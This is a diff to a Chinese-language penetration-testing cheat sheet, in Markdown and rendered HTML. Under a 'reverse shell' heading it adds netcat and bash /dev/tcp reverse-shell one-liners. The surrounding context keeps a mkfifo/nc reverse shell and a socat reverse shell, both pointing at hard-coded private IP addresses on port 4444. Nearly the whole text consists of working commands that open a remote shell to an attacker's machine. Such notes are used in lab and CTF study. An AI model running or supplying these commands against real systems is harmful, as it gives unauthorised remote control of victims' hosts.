@@ -64,7 +64,10 @@
 
 
 ## 反向shell
-`bash -i >& /dev/tcp/$ip/$port 0>&1`
+Netcat
+`nc $IP $PORT -e /bin/bash`
+bash
+`/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'`
 不支持/dev/tcp
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.218.148 4444 > /tmp/f`
 
@@ -142,7 +145,10 @@
 
 
 ## 反向shell
-`bash -i >& /dev/tcp/$ip/$port 0>&1`
+Netcat
+`nc $IP $PORT -e /bin/bash`
+bash
+`/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'`
 不支持/dev/tcp
 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.218.148 4444 > /tmp/f`
 
@@ -283,7 +289,10 @@ fg：将挂起的进程带回前台</p>
 <h4>Victim:</h4>
 <p><code class="notranslate">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</code></p>
 <h2>反向shell</h2>
-<p><code class="notranslate">bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1</code><br>
+<p>Netcat<br>
+<code class="notranslate">nc $IP $PORT -e /bin/bash</code><br>
+bash<br>
+<code class="notranslate">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1'</code><br>
 不支持/dev/tcp<br>
 <code class="notranslate">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.218.148 4444 &gt; /tmp/f</code></p>
 <h2>生成shell</h2>
